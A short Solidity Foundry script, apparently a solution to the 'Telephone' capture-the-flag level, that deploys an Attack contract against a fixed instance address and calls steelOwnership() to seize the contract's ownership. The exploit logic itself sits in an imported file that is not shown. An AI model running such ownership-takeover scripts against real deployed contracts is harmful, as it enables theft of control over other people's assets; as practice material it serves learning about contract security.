// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script} from "forge-std/Script.sol";
import "../src/Attack.sol";

contract Solve is Script {
    Attack attack;
    address internal addr_Instance = 0x46f5C472B3F81bA00240Ae0523feDe2eb65D41b9;

    function run() external {
        vm.startBroadcast();
        attack = new Attack(Telephone(addr_Instance));

        attack.steelOwnership();
        vm.stopBroadcast();

    }
}